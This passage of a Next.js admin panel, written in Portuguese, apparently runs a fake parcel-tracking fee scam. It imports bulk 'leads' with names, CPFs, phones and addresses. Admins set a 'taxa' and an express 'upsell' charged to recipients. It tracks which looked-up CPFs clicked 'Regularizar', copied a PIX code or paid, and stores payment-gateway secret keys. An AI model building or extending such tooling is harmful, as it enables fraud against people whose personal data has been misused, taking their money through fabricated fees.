"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import {
  Upload,
  Settings,
  Package,
  CheckCircle,
  AlertCircle,
  List,
  Trash2,
  LogOut,
  Users,
  CreditCard,
} from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { Table, TableBody, TableHead, TableHeader, TableRow, TableCell } from "@/components/ui/table"

interface CpfTracking {
  id: string
  cpf: string
  nome: string | null
  consulted_at: string
  pix_copied: boolean
  pix_copied_at: string | null
  ip_address: string | null
  clicked_regularizar: boolean
  payment_generated: boolean
  payment_status: string
}

interface PackageData {
  nome: string
  telefone: string
  cpf: string
  endereco: string
  produto: string
  codigo_rastreio: string
  status: string
}

export default function AdminPage() {
  const router = useRouter()
  const [companyName, setCompanyName] = useState("Rastreamento de Encomendas")
  const [logoUrl, setLogoUrl] = useState("")
  const [bannerUrl, setBannerUrl] = useState("")
  const [csvFile, setCsvFile] = useState<File | null>(null)
  const [uploading, setUploading] = useState(false)
  const [message, setMessage] = useState<{ type: "success" | "error"; text: string } | null>(null)
  const [stats, setStats] = useState({
    total: 0,
    postado: 0,
    emRota: 0,
    taxado: 0,
    entregue: 0,
    approvedPayments: 0, // Added approved payments counter
  })
  const [packages, setPackages] = useState<PackageData[]>([])
  const [loadingPackages, setLoadingPackages] = useState(false)
  const [clearing, setClearing] = useState(false)
  const [totalPackages, setTotalPackages] = useState(0)
  const [cpfTracking, setCpfTracking] = useState<CpfTracking[]>([])
  const [loadingTracking, setLoadingTracking] = useState(false)
  const [gatewayName, setGatewayName] = useState("Hygros")
  const [apiUrl, setApiUrl] = useState("")
  const [secretKey, setSecretKey] = useState("")
  const [companyId, setCompanyId] = useState("")
  const [trackingByDate, setTrackingByDate] = useState<Record<string, CpfTracking[]>>({})
  const [totalPixCopied, setTotalPixCopied] = useState(0)
  const [taxValue, setTaxValue] = useState(5349) // Updated default to R$ 53,49
  const [upsellValue, setUpsellValue] = useState(1653) // Added upsell value state
  const [lists, setLists] = useState<any[]>([])
  const [selectedListId, setSelectedListId] = useState<string>("")
  const [newListName, setNewListName] = useState("")
  const [loadingLists, setLoadingLists] = useState(false)
  const [filterListId, setFilterListId] = useState<string>("")

  useEffect(() => {
    loadSettings()
    loadStats()
    loadTaxValue()
    loadUpsellValue()
    loadLists()
  }, [])

  const loadLists = async () => {
    try {
      setLoadingLists(true)
      const response = await fetch("/api/admin/lists")
      const data = await response.json()
      setLists(data.lists || [])
    } catch (error) {
      console.error("Error loading lists:", error)
    } finally {
      setLoadingLists(false)
    }
  }

  const handleCreateList = async () => {
    if (!newListName.trim()) {
      setMessage({ type: "error", text: "Digite um nome para a lista" })
      setTimeout(() => setMessage(null), 3000)
      return
    }

    try {
      const response = await fetch("/api/admin/lists", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: newListName }),
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Lista criada com sucesso!" })
        setNewListName("")
        loadLists()
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error("Erro ao criar lista")
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao criar lista" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  const handleDeleteList = async (id: string) => {
    if (!confirm("Tem certeza que deseja deletar esta lista? TODOS os leads dessa lista serão removidos permanentemente!")) return

    try {
      const response = await fetch(`/api/admin/lists?id=${id}`, {
        method: "DELETE",
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Lista e todos os leads deletados com sucesso!" })
        loadLists()
        loadStats() // Reload stats to update leads count
        setTimeout(() => setMessage(null), 3000)
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao deletar lista" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  const loadSettings = async () => {
    try {
      const response = await fetch("/api/admin/settings")
      const data = await response.json()
      if (data.company_name) setCompanyName(data.company_name)
      if (data.logo_url) setLogoUrl(data.logo_url)
      if (data.banner_url) setBannerUrl(data.banner_url)
    } catch (error) {
      console.error("Error loading settings:", error)
    }
  }

  const loadStats = async () => {
    try {
      const response = await fetch("/api/admin/stats")
      const data = await response.json()
      setStats(data)
    } catch (error) {
      console.error("Error loading stats:", error)
    }
  }

  const loadPackages = async (listaId?: string) => {
    try {
      setLoadingPackages(true)
      const listFilter = listaId !== undefined ? listaId : filterListId
      const url = listFilter ? `/api/admin/packages?lista_id=${listFilter}` : "/api/admin/packages"
      const response = await fetch(url)
      const data = await response.json()
      setPackages(data.packages || [])
      setTotalPackages(data.total || 0)
    } catch (error) {
      console.error("Error loading packages:", error)
    } finally {
      setLoadingPackages(false)
    }
  }

  const handleSaveSettings = async () => {
    try {
      const response = await fetch("/api/admin/settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ company_name: companyName, logo_url: logoUrl, banner_url: bannerUrl }),
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Configurações salvas com sucesso!" })
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error("Erro ao salvar configurações")
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao salvar configurações" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  const handleUploadCSV = async () => {
    if (!csvFile) {
      setMessage({ type: "error", text: "Selecione um arquivo CSV ou XLSX" })
      setTimeout(() => setMessage(null), 3000)
      return
    }

    setUploading(true)
    const formData = new FormData()
    formData.append("file", csvFile)
    if (selectedListId) {
      formData.append("lista_id", selectedListId)
    }

    try {
      const response = await fetch("/api/admin/upload", {
        method: "POST",
        body: formData,
      })

      const data = await response.json()

      if (response.ok) {
        setMessage({ type: "success", text: `${data.count} pacotes importados com sucesso!` })
        setCsvFile(null)
        loadStats()
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error(data.error || "Erro ao importar CSV ou XLSX")
      }
    } catch (error) {
      setMessage({ type: "error", text: error instanceof Error ? error.message : "Erro ao importar CSV ou XLSX" })
      setTimeout(() => setMessage(null), 3000)
    } finally {
      setUploading(false)
    }
  }

  const handleClearDatabase = async () => {
    if (
      !confirm("Tem certeza que deseja LIMPAR TODOS os pacotes do banco de dados? Esta ação não pode ser desfeita!")
    ) {
      return
    }

    try {
      setClearing(true)
      const response = await fetch("/api/admin/clear", {
        method: "DELETE",
      })

      const data = await response.json()

      if (response.ok) {
        setMessage({ type: "success", text: "Banco de dados limpo com sucesso!" })
        setPackages([])
        loadStats()
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error(data.error || "Erro ao limpar banco de dados")
      }
    } catch (error) {
      setMessage({ type: "error", text: error instanceof Error ? error.message : "Erro ao limpar banco de dados" })
      setTimeout(() => setMessage(null), 3000)
    } finally {
      setClearing(false)
    }
  }

  const loadCpfTracking = async () => {
    try {
      setLoadingTracking(true)
      const response = await fetch("/api/admin/cpf-tracking")
      const data = await response.json()
      setCpfTracking(data.tracking || [])
      setTotalPixCopied(data.stats?.totalPixCopied || 0)

      // Group by date
      const grouped: Record<string, CpfTracking[]> = {}
      data.tracking?.forEach((track: CpfTracking) => {
        const date = new Date(track.consulted_at).toLocaleDateString("pt-BR")
        if (!grouped[date]) grouped[date] = []
        grouped[date].push(track)
      })
      setTrackingByDate(grouped)
    } catch (error) {
      console.error("Error loading CPF tracking:", error)
    } finally {
      setLoadingTracking(false)
    }
  }

  const handleDeleteDate = async (date: string) => {
    if (!confirm(`Deseja deletar todas as consultas do dia ${date}?`)) return

    try {
      const dateObj = date.split("/").reverse().join("-")
      const response = await fetch(`/api/admin/cpf-tracking?date=${dateObj}`, {
        method: "DELETE",
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Consultas deletadas com sucesso!" })
        loadCpfTracking()
        setTimeout(() => setMessage(null), 3000)
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao deletar consultas" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  const loadGatewaySettings = async () => {
    try {
      const response = await fetch("/api/admin/gateway")
      const data = await response.json()
      setGatewayName(data.gateway_name || "Hygros")
      setApiUrl(data.api_url || "")
      setSecretKey(data.secret_key || "")
      setCompanyId(data.company_id || "")
    } catch (error) {
      console.error("Error loading gateway settings:", error)
    }
  }

  const handleSaveGateway = async () => {
    try {
      const response = await fetch("/api/admin/gateway", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          gateway_name: gatewayName,
          api_url: apiUrl,
          secret_key: secretKey,
          company_id: companyId,
        }),
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Gateway configurado com sucesso!" })
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error("Erro ao salvar gateway")
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao salvar gateway" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  const handleLogout = async () => {
    await fetch("/api/admin/logout", { method: "POST" })
    router.push("/admin/login")
  }

  const loadTaxValue = async () => {
    try {
      const response = await fetch("/api/admin/tax-value")
      const data = await response.json()
      setTaxValue(data.value || 5349)
    } catch (error) {
      console.error("Error loading tax value:", error)
    }
  }

  const handleSaveTaxValue = async () => {
    try {
      const response = await fetch("/api/admin/tax-value", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value: taxValue }),
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Valor da taxa atualizado!" })
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error("Erro ao salvar valor da taxa")
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao salvar valor da taxa" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  const loadUpsellValue = async () => {
    try {
      const response = await fetch("/api/admin/upsell-value")
      const data = await response.json()
      setUpsellValue(data.value || 1653)
    } catch (error) {
      console.error("Error loading upsell value:", error)
    }
  }

  const handleSaveUpsellValue = async () => {
    try {
      const response = await fetch("/api/admin/upsell-value", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value: upsellValue }),
      })

      if (response.ok) {
        setMessage({ type: "success", text: "Valor do upsell atualizado!" })
        setTimeout(() => setMessage(null), 3000)
      } else {
        throw new Error("Erro ao salvar valor do upsell")
      }
    } catch (error) {
      setMessage({ type: "error", text: "Erro ao salvar valor do upsell" })
      setTimeout(() => setMessage(null), 3000)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 p-6">
      <div className="mx-auto max-w-6xl">
        <div className="mb-8 flex items-center justify-between">
          <div>
            <h1 className="text-4xl font-bold text-slate-900">Painel Administrativo</h1>
            <p className="mt-2 text-slate-600">Gerencie configurações e importações de pacotes</p>
          </div>
          <Button variant="outline" onClick={handleLogout} className="gap-2 bg-transparent">
            <LogOut className="h-4 w-4" />
            Sair
          </Button>
        </div>

        {message && (
          <Alert
            className={`mb-6 ${message.type === "success" ? "border-green-500 bg-green-50" : "border-red-500 bg-red-50"}`}
          >
            {message.type === "success" ? (
              <CheckCircle className="h-4 w-4 text-green-600" />
            ) : (
              <AlertCircle className="h-4 w-4 text-red-600" />
            )}
            <AlertDescription className={message.type === "success" ? "text-green-900" : "text-red-900"}>
              {message.text}
            </AlertDescription>
          </Alert>
        )}

        <Tabs
          defaultValue="stats"
          className="space-y-6"
          onValueChange={(value) => {
            if (value === "leads") loadPackages()
            if (value === "tracking") loadCpfTracking()
            if (value === "gateway") loadGatewaySettings()
            if (value === "tax") loadTaxValue()
            if (value === "stats") loadStats()
            if (value === "upsell") loadUpsellValue()
            if (value === "lists") loadLists()
            if (value === "upload") loadLists()
          }}
        >
          <div className="overflow-x-auto pb-2">
            <TabsList className="inline-flex h-auto min-w-max gap-1 p-1">
              <TabsTrigger value="stats" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <Package className="h-3 w-3" />
                Estatísticas
              </TabsTrigger>
              <TabsTrigger value="upload" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <Upload className="h-3 w-3" />
                Upload
              </TabsTrigger>
              <TabsTrigger value="leads" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <List className="h-3 w-3" />
                Leads
              </TabsTrigger>
              <TabsTrigger value="tracking" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <Users className="h-3 w-3" />
                CPFs
              </TabsTrigger>
              <TabsTrigger value="gateway" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <CreditCard className="h-3 w-3" />
                Gateway
              </TabsTrigger>
              <TabsTrigger value="settings" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <Settings className="h-3 w-3" />
                Config
              </TabsTrigger>
              <TabsTrigger value="tax" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <CreditCard className="h-3 w-3" />
                Taxa
              </TabsTrigger>
              <TabsTrigger value="upsell" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <CreditCard className="h-3 w-3" />
                Upsell
              </TabsTrigger>
              <TabsTrigger value="lists" className="flex items-center gap-1 px-3 py-2 text-xs whitespace-nowrap">
                <List className="h-3 w-3" />
                Listas
              </TabsTrigger>
            </TabsList>
          </div>

          <TabsContent value="stats" className="space-y-4">
            <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Leads no Banco</CardTitle>
                  <Users className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{stats.total}</div>
                  <p className="text-xs text-muted-foreground">Total de registros</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Capacidade Disponível</CardTitle>
                  <Package className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{500000 - stats.total}</div>
                  <p className="text-xs text-muted-foreground">Limite do Supabase Free Tier</p>
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">Pagamentos Aprovados</CardTitle>
                  <CheckCircle className="h-4 w-4 text-green-600" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold text-green-600">{stats.approvedPayments}</div>
                  <p className="text-xs text-muted-foreground">Vendas confirmadas</p>
                  {stats.totalAmountPaid > 0 && (
                    <p className="text-sm font-semibold text-green-700 mt-1">
                      Total: R$ {(stats.totalAmountPaid / 100).toFixed(2)}
                    </p>
                  )}
                </CardContent>
              </Card>

              <Card>
                <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
                  <CardTitle className="text-sm font-medium">PIX Copiados</CardTitle>
                  <CreditCard className="h-4 w-4 text-muted-foreground" />
                </CardHeader>
                <CardContent>
                  <div className="text-2xl font-bold">{totalPixCopied}</div>
                  <p className="text-xs text-muted-foreground">Total de códigos copiados</p>
                </CardContent>
              </Card>
            </div>
          </TabsContent>

          <TabsContent value="upload">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Package className="h-5 w-5" />
                  Importar Pacotes
                </CardTitle>
                <CardDescription>
                  Faça upload de um arquivo CSV ou XLSX com as informações dos pacotes. O arquivo deve ter as colunas
                  nesta ordem:
                  <strong> nome, telefone, cpf, endereco, produto, codigorastreio</strong>
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="lista-select">Selecionar Lista (opcional)</Label>
                  <select
                    id="lista-select"
                    value={selectedListId}
                    onChange={(e) => setSelectedListId(e.target.value)}
                    className="w-full border rounded-md px-3 py-2 text-sm"
                    disabled={uploading}
                  >
                    <option value="">Sem lista (padrão)</option>
                    {lists.map((list) => (
                      <option key={list.id} value={list.id}>
                        {list.name}
                      </option>
                    ))}
                  </select>
                  <p className="text-xs text-slate-500">
                    Associe os leads a uma lista para rastrear estatísticas separadamente
                  </p>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="csv-file">Arquivo CSV ou XLSX</Label>
                  <Input
                    id="csv-file"
                    type="file"
                    accept=".csv,.xlsx,.xls"
                    onChange={(e) => setCsvFile(e.target.files?.[0] || null)}
                    disabled={uploading}
                  />
                  {csvFile && (
                    <p className="text-sm text-slate-600">
                      Arquivo selecionado: <span className="font-medium">{csvFile.name}</span>
                    </p>
                  )}
                </div>
                <Button onClick={handleUploadCSV} disabled={!csvFile || uploading} className="w-full">
                  {uploading ? "Importando..." : "Importar Pacotes"}
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="leads">
            <Card>
              <CardHeader>
                <div className="flex items-center justify-between">
                  <div>
                    <CardTitle className="flex items-center gap-2">
                      <List className="h-5 w-5" />
                      Leads Cadastrados
                    </CardTitle>
                    <CardDescription>
                      Total de {totalPackages.toLocaleString("pt-BR")} leads no sistema
                      {packages.length < totalPackages && ` (carregando todos...)`}
                    </CardDescription>
                  </div>
                  <Button
                    variant="destructive"
                    size="sm"
                    onClick={handleClearDatabase}
                    disabled={clearing || packages.length === 0}
                    className="gap-2"
                  >
                    <Trash2 className="h-4 w-4" />
                    {clearing ? "Limpando..." : "Limpar Banco"}
                  </Button>
                </div>
              </CardHeader>
              <CardContent>
                {loadingPackages ? (
                  <div className="flex flex-col items-center justify-center py-12 space-y-4">
                    <div className="h-12 w-12 border-4 border-red-600 border-t-transparent rounded-full animate-spin" />
                    <p className="text-sm text-gray-600">Carregando {totalPackages.toLocaleString("pt-BR")} leads...</p>
                  </div>
                ) : (
                  <div className="space-y-4">
                    <div className="flex items-center gap-4">
                      <Input
                        placeholder="Buscar por nome, CPF ou código..."
                        className="max-w-sm"
                        onChange={(e) => {
                          const search = e.target.value.toLowerCase()
                          if (search) {
                            const filtered = packages.filter(
                              (pkg) =>
                                pkg.nome.toLowerCase().includes(search) ||
                                pkg.cpf.includes(search) ||
                                pkg.codigo_rastreio.toLowerCase().includes(search),
                            )
                            setPackages(filtered)
                          } else {
                            loadPackages()
                          }
                        }}
                      />
                      <div className="text-sm text-gray-600">
                        Mostrando {packages.length.toLocaleString("pt-BR")} de {totalPackages.toLocaleString("pt-BR")}{" "}
                        leads
                      </div>
                    </div>
                    <div className="overflow-x-auto max-h-[600px] overflow-y-auto border rounded-lg">
                      <table className="w-full text-sm">
                        <thead className="bg-gray-100 text-left sticky top-0">
                          <tr>
                            <th className="p-2 font-medium">Nome</th>
                            <th className="p-2 font-medium">CPF</th>
                            <th className="p-2 font-medium">Telefone</th>
                            <th className="p-2 font-medium">Produto</th>
                            <th className="p-2 font-medium">Código Rastreio</th>
                            <th className="p-2 font-medium">Status</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y">
                          {packages.map((pkg, index) => (
                            <tr key={index} className="hover:bg-gray-50">
                              <td className="p-2">{pkg.nome}</td>
                              <td className="p-2 font-mono text-xs">{pkg.cpf}</td>
                              <td className="p-2">{pkg.telefone}</td>
                              <td className="p-2">{pkg.produto}</td>
                              <td className="p-2 font-mono text-xs">{pkg.codigo_rastreio}</td>
                              <td className="p-2">
                                <span className="inline-flex items-center rounded-full bg-red-100 px-2 py-1 text-xs font-medium text-red-700">
                                  {pkg.status}
                                </span>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="tracking">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Users className="h-5 w-5" />
                  CPF Puxados
                </CardTitle>
                <CardDescription>
                  Total de PIX copiados: <strong>{totalPixCopied}</strong> | Consultas por dia abaixo
                </CardDescription>
              </CardHeader>
              <CardContent>
                {loadingTracking ? (
                  <div className="flex flex-col items-center justify-center py-12 space-y-4">
                    <div className="h-12 w-12 border-4 border-red-600 border-t-transparent rounded-full animate-spin" />
                    <p className="text-sm text-gray-600">Carregando dados...</p>
                  </div>
                ) : (
                  <div className="space-y-4">
                    {Object.entries(trackingByDate).map(([date, tracks]) => (
                      <div key={date} className="border rounded-lg p-4 space-y-3">
                        <div className="flex items-center justify-between">
                          <h3 className="font-semibold text-lg">{date}</h3>
                          <div className="flex items-center gap-3">
                            <span className="text-sm text-gray-600">{tracks.length} consultas</span>
                            <Button
                              variant="destructive"
                              size="sm"
                              onClick={() => handleDeleteDate(date)}
                              className="gap-1"
                            >
                              <Trash2 className="h-3 w-3" />
                              Deletar
                            </Button>
                          </div>
                        </div>
                        <div className="overflow-x-auto max-h-[300px] overflow-y-auto border rounded">
                          <Table>
                            <TableHeader>
                              <TableRow>
                                <TableHead className="w-[120px]">CPF</TableHead>
                                <TableHead>Nome</TableHead>
                                <TableHead className="text-center">Regularizar</TableHead>
                                <TableHead className="text-center">PIX Copiado</TableHead>
                                <TableHead className="text-center">Status</TableHead>
                              </TableRow>
                            </TableHeader>
                            <TableBody>
                              {tracks.map((track) => (
                                <TableRow key={track.id}>
                                  <TableCell className="font-mono text-xs">{track.cpf}</TableCell>
                                  <TableCell className="text-sm">{track.nome || "-"}</TableCell>
                                  <TableCell className="text-center">
                                    {track.clicked_regularizar ? (
                                      <CheckCircle className="h-4 w-4 text-green-600 mx-auto" />
                                    ) : (
                                      <span className="text-slate-400">-</span>
                                    )}
                                  </TableCell>
                                  <TableCell className="text-center">
                                    {track.pix_copied ? (
                                      <CheckCircle className="h-4 w-4 text-orange-600 mx-auto" />
                                    ) : (
                                      <span className="text-slate-400">-</span>
                                    )}
                                  </TableCell>
                                  <TableCell className="text-center">
                                    {track.payment_status === "paid" ? (
                                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-100 text-green-800 text-xs font-medium">
                                        Pago
                                      </span>
                                    ) : (
                                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-yellow-100 text-yellow-800 text-xs font-medium">
                                        Pendente
                                      </span>
                                    )}
                                  </TableCell>
                                </TableRow>
                              ))}
                            </TableBody>
                          </Table>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="gateway">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <CreditCard className="h-5 w-5" />
                  Configuração do Gateway de Pagamento
                </CardTitle>
                <CardDescription>
                  Configure as credenciais do gateway de pagamento
                  <div className="mt-4 p-4 bg-blue-50 border border-blue-200 rounded-lg">
                    <p className="text-sm text-blue-900 mb-2">
                      <strong>💡 Sugestão:</strong> No futuro, você poderá usar IA para configurar automaticamente o
                      gateway enviando a documentação da API.
                    </p>
                    <p className="text-xs text-blue-700">
                      Por enquanto, preencha manualmente os campos abaixo com as informações do seu gateway.
                    </p>
                  </div>
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="gateway-name">Nome do Gateway</Label>
                  <Input
                    id="gateway-name"
                    value={gatewayName}
                    onChange={(e) => setGatewayName(e.target.value)}
                    placeholder="Hygros, Stripe, etc."
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="api-url">URL da API</Label>
                  <Input
                    id="api-url"
                    value={apiUrl}
                    onChange={(e) => setApiUrl(e.target.value)}
                    placeholder="https://api.gateway.com.br/v1"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="secret-key">Secret Key</Label>
                  <Input
                    id="secret-key"
                    type="password"
                    value={secretKey}
                    onChange={(e) => setSecretKey(e.target.value)}
                    placeholder="sk_live_..."
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="company-id">Company ID</Label>
                  <Input
                    id="company-id"
                    value={companyId}
                    onChange={(e) => setCompanyId(e.target.value)}
                    placeholder="abc123..."
                  />
                </div>
                <Button onClick={handleSaveGateway} className="w-full">
                  Salvar Configurações do Gateway
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="settings">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Settings className="h-5 w-5" />
                  Configurações da Empresa
                </CardTitle>
                <CardDescription>Personalize o nome, logo e banner da sua página de rastreamento</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-2">
                  <Label htmlFor="company-name">Nome da Empresa</Label>
                  <Input
                    id="company-name"
                    value={companyName}
                    onChange={(e) => setCompanyName(e.target.value)}
                    placeholder="Nome da sua empresa"
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="logo-url">URL do Logo</Label>
                  <Input
                    id="logo-url"
                    value={logoUrl}
                    onChange={(e) => setLogoUrl(e.target.value)}
                    placeholder="https://exemplo.com/logo.png"
                  />
                  {logoUrl && (
                    <div className="mt-4 flex items-center gap-4 rounded-lg border bg-slate-50 p-4">
                      <img
                        src={logoUrl || "/placeholder.svg"}
                        alt="Preview do logo"
                        className="h-16 w-16 object-contain"
                      />
                      <div>
                        <p className="text-sm font-medium">Preview do Logo</p>
                        <p className="text-xs text-slate-600">Será exibido no canto superior esquerdo</p>
                      </div>
                    </div>
                  )}
                </div>

                <div className="space-y-2">
                  <Label htmlFor="banner-url">URL do Banner de Fundo</Label>
                  <Input
                    id="banner-url"
                    value={bannerUrl}
                    onChange={(e) => setBannerUrl(e.target.value)}
                    placeholder="https://exemplo.com/banner.jpg"
                  />
                  <p className="text-xs text-slate-600">
                    Banner que aparecerá no topo da página com o campo de busca por CPF
                  </p>
                  {bannerUrl && (
                    <div className="mt-4 overflow-hidden rounded-lg border bg-slate-50">
                      <img
                        src={bannerUrl || "/placeholder.svg"}
                        alt="Preview do banner"
                        className="h-48 w-full object-cover"
                      />
                      <div className="p-4">
                        <p className="text-sm font-medium">Preview do Banner</p>
                        <p className="text-xs text-slate-600">Será usado como fundo da seção de rastreamento</p>
                      </div>
                    </div>
                  )}
                </div>

                <Button onClick={handleSaveSettings} className="w-full">
                  Salvar Configurações
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="tax">
            <Card>
              <CardHeader>
                <CardTitle>Configurar Valor da Taxa</CardTitle>
                <CardDescription>Defina o valor da taxa que será cobrada dos clientes (em centavos)</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="tax-value">Valor da Taxa (centavos)</Label>
                  <Input
                    id="tax-value"
                    type="number"
                    value={taxValue}
                    onChange={(e) => setTaxValue(Number(e.target.value))}
                    placeholder="5349"
                  />
                  <p className="text-sm text-gray-600">
                    Valor atual: <strong>R$ {(taxValue / 100).toFixed(2)}</strong>
                  </p>
                  <p className="text-xs text-gray-500">Para R$ 50,00 = 5000 centavos | Para R$ 35,43 = 3543 centavos</p>
                </div>
                <Button onClick={handleSaveTaxValue} className="w-full">
                  Salvar Valor da Taxa
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="upsell">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <CreditCard className="h-5 w-5" />
                  Configurar Valor do Upsell
                </CardTitle>
                <CardDescription>Defina o valor da entrega expressa em 24 horas (em centavos)</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="upsell-value">Valor do Upsell (centavos)</Label>
                  <Input
                    id="upsell-value"
                    type="number"
                    value={upsellValue}
                    onChange={(e) => setUpsellValue(Number.parseInt(e.target.value))}
                    placeholder="1653 (R$ 16,53)"
                  />
                  <p className="text-sm text-gray-600">
                    Valor atual: R${" "}
                    {(upsellValue / 100).toLocaleString("pt-BR", {
                      minimumFractionDigits: 2,
                      maximumFractionDigits: 2,
                    })}
                  </p>
                </div>
                <Button onClick={handleSaveUpsellValue} className="w-full">
                  Salvar Valor do Upsell
                </Button>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="lists">
            <Card>
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <List className="h-5 w-5" />
                  Gerenciar Listas
                </CardTitle>
                <CardDescription>
                  Crie listas para organizar seus leads e acompanhar estatísticas separadamente
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="flex gap-2">
                  <Input
                    placeholder="Nome da nova lista (ex: Lista 1, Campanha Janeiro)"
                    value={newListName}
                    onChange={(e) => setNewListName(e.target.value)}
                  />
                  <Button onClick={handleCreateList}>Criar Lista</Button>
                </div>

                {loadingLists ? (
                  <div className="flex items-center justify-center py-8">
                    <div className="h-8 w-8 border-4 border-red-600 border-t-transparent rounded-full animate-spin" />
                  </div>
                ) : lists.length === 0 ? (
                  <p className="text-center text-gray-500 py-8">Nenhuma lista criada ainda</p>
                ) : (
                  <div className="space-y-4">
                    {lists.map((list) => (
                      <div
                        key={list.id}
                        className="border rounded-lg p-4 space-y-3"
                      >
                        <div className="flex items-center justify-between">
                          <h3 className="font-semibold text-lg">{list.name}</h3>
                          <Button
                            variant="destructive"
                            size="sm"
                            onClick={() => handleDeleteList(list.id)}
                            className="gap-1"
                          >
                            <Trash2 className="h-3 w-3" />
                            Deletar
                          </Button>
                        </div>
                        <div className="grid grid-cols-4 gap-3 text-center">
                          <div className="bg-blue-50 rounded-lg p-3">
                            <p className="text-xl font-bold text-blue-600">{list.total_leads}</p>
                            <p className="text-xs text-blue-800">Leads</p>
                          </div>
                          <div className="bg-orange-50 rounded-lg p-3">
                            <p className="text-xl font-bold text-orange-600">{list.cpfs_puxados}</p>
                            <p className="text-xs text-orange-800">CPFs Puxados</p>
                          </div>
                          <div className="bg-purple-50 rounded-lg p-3">
